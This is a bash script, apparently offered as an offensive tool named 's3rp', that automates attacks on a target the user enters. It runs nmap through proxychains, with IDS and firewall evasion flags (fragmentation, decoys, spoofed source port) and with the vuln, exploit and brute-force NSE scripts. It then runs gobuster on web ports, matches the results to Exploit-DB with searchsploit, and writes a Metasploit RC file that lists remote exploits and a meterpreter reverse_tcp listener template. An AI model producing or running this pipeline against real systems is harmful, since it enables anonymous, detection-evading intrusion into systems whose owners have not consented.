#!/bin/bash

# ==============================================================================
# DEVELOPER: oxbv1 | 0xb0rn3
# GITHUB:    github.com/0xb0rn3/s3rp
# MISSION:   Zero Boundaries. Total Anonymity. Automated Exploitation.
# ==============================================================================

# --- UI COLORS ---
RED='\033[1;31m'
GRN='\033[1;32m'
CYN='\033[0;36m'
YEL='\033[1;33m'
WHT='\033[1;37m'
NC='\033[0m'

# --- BANNER ---
banner() {
    clear
    echo -e "${RED}"
    echo "  ███████╗██████╗ ██████╗ ██████╗ "
    echo "  ██╔════╝╚════██╗██╔══██╗██╔══██╗"
    echo "  ███████╗ █████╔╝██████╔╝██████╔╝"
    echo "  ╚════██║ ╚═══██╗██╔══██╗██╔═══╝ "
    echo "  ███████║██████╔╝██║  ██║██║     "
    echo "  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     "
    echo -e "${WHT}      [ PERSISTENCE : ANONYMITY : APEX ]${NC}"
    echo -e "${CYN}      [ DEVELOPER: oxbv1 | 0xb0rn3 ]${NC}"
    echo "==================================================="
}

# --- SYSTEM & PROXY CHECK ---
prep_environment() {
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] ROOT REQUIRED. RUN WITH SUDO.${NC}"; exit 1; }

    # Check for all integrated tools
    local tools=("nmap" "searchsploit" "msfconsole" "proxychains4" "gobuster" "xsltproc")
    for tool in "${tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${YEL}[!] Warning: $tool is missing. Install for full power.${NC}"
        fi
    done

    # Check ProxyChains layer
    if command -v proxychains4 &> /dev/null; then
        PC="proxychains4 -q"
        echo -e "${GRN}[+] ProxyChains Layer: ENABLED${NC}"
    else
        PC=""
        echo -e "${RED}[!] ProxyChains Layer: MISSING (Anonymity at risk)${NC}"
    fi
}

# --- CONFIGURATION MODULE ---
configure_op() {
    echo -e "\n${YEL}[+] TARGET ACQUISITION:${NC}"
    read -p ">> IP / CIDR / URL: " TARGET
    [ -z "$TARGET" ] && exit 1

    SESSION_DIR="s3rp_OP_$(date +%H%M%S)"
    mkdir -p "$SESSION_DIR/web_discovery"
    OUT_BASE="$SESSION_DIR/s3rp_results"

    echo -e "\n${YEL}[+] SELECT ENGAGEMENT RULES:${NC}"
    echo -e "1. ${CYN}Ghost Recon${NC} (Bypass IDS/FW, MTU 8, 10 Decoys, DNS Spoofing)"
    echo -e "2. ${RED}Exploit Hunter${NC} (Aggressive NSE, Vuln, Brute-force, Auth)"
    echo -e "3. ${WHT}Total War${NC} (p-, A, OS Guessing, Max Intensity)"
    read -p ">> Selection: " MODE

    case $MODE in
        1) FLAGS="-sS -Pn -f --mtu 8 -g 53 -D RND:10 --data-length 32 -T2"
           NSE="--script=banner,firewalk" ;;
        2) FLAGS="-sV --version-all -Pn -O --osscan-guess -T4"
           NSE="--script=vuln,exploit,auth,brute" ;;
        3) FLAGS="-p- -A -sV -Pn --version-intensity 9 -T4"
           NSE="--script=default,safe,vuln,exploit" ;;
    esac
}

# --- RECON & WEB DISCOVERY ---
execute_recon() {
    echo -e "\n${RED}[!] INITIATING SCAN THROUGH PROXYCHAINS...${NC}"
    
    # Run Nmap and strip banners as requested
    $PC nmap $FLAGS $NSE $TARGET -oA "$OUT_BASE" --stats-every 10s | \
    grep -vE "Starting Nmap|Nmap done|tcpwrapped"

    # HTML Report Generation
    if command -v xsltproc &> /dev/null; then
        xsltproc "${OUT_BASE}.xml" -o "${OUT_BASE}.html" 2>/dev/null
    fi

    # Trigger Gobuster for Web Ports
    echo -e "\n${YEL}[+] SCANNING FOR WEB VECTORS...${NC}"
    grep -E "80/open|443/open|8080/open" "${OUT_BASE}.nmap" | while read -r line; do
        PORT=$(echo $line | cut -d'/' -f1)
        PROTO=$( [[ "$PORT" == "443" ]] && echo "https" || echo "http" )
        URL="${PROTO}://${TARGET}:${PORT}"
        
        echo -e "${CYN}[*] Launching Gobuster on: $URL${NC}"
        $PC gobuster dir -u "$URL" -w /usr/share/wordlists/dirb/common.txt -t 50 -k -o "$SESSION_DIR/web_discovery/port_${PORT}.txt" -q
    done
}

# --- EXPLOIT & METASPLOIT AUTOMATION ---
automate_exploit() {
    echo -e "\n${YEL}[+] CROSS-REFERENCING EXPLOIT-DB...${NC}"
    searchsploit --nmap "${OUT_BASE}.xml" > "${SESSION_DIR}/exploits_found.txt"
    
    # Build Metasploit RC File
    RC_FILE="${SESSION_DIR}/s3rp_launch.rc"
    
    {
        echo "spool ${SESSION_DIR}/msf_session.log"
        echo "workspace -a s3rp_redteam"
        echo "db_import ${OUT_BASE}.xml"
        echo "hosts"
        echo "services"
        echo "# --- RECOMMENDED MSF ATTACK VECTORS ---"
        grep "exploits/remote/" "${SESSION_DIR}/exploits_found.txt" | awk '{print "# use exploit" substr($NF, index($NF, "/"))}' | sed 's/\.rb//' >> "$RC_FILE"
        echo "# --- LISTENER MODULES ---"
        echo "# use exploit/multi/handler"
        echo "# set PAYLOAD windows/x64/meterpreter/reverse_tcp"
        echo "# set LHOST <YOUR_IP>"
        echo "# set LPORT 4444"
        echo "# exploit -j"
    } > "$RC_FILE"
}

# --- FINAL OUTPUT ---
show_summary() {
    echo -e "\n${WHT}===================================================${NC}"
    echo -e "${RED}s3rp MISSION COMPLETE${NC}"
    echo -e "---------------------------------------------------"
    echo -e "Intel Directory: ${CYN}$SESSION_DIR${NC}"
    echo -e "Visual Report:   ${CYN}${OUT_BASE}.html${NC}"
    echo -e "Web Discovery:   ${CYN}${SESSION_DIR}/web_discovery/${NC}"
    echo -e "Searchsploit:    ${CYN}${SESSION_DIR}/exploits_found.txt${NC}"
    echo -e "Metasploit RC:   ${WHT}msfconsole -r $RC_FILE${NC}"
    echo -e "---------------------------------------------------"
    echo -e "${YEL}Next: Use the .rc file to launch exploitation.${NC}"
    echo -e "===================================================${NC}"
}

# --- START ---
banner
prep_environment
configure_op
execute_recon
automate_exploit
show_summary
